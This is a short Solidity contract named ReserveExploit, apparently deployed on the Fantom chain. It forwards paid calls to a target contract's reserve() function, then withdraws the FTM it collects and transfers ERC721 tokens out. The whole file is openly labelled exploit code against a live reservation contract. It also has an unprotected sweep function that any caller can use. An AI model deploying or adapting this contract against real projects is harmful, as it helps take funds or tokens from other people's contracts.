/**
 *Submitted for verification at FtmScan.com on 2022-04-01
*/

//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

interface IReserve {
  function reserve(string memory _name) payable external;
}

interface IERC721 {
  function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
}

contract ReserveExploit {

  address private ca;

  constructor(address reservationContract) {
    ca = reservationContract;
  }

  function exploit(string memory _name) public payable {
    IReserve(ca).reserve(_name);
  }

  function sweepFTM() public {
    uint balance = address(this).balance;
    require(balance > 0, "Exploiter: No FTM to withdraw");
    payable(msg.sender).transfer(balance);
  }

  function ERC721(address erc721, address to, uint256 token) public {
    IERC721(erc721).transferFrom(address(this),to,token);
  }
}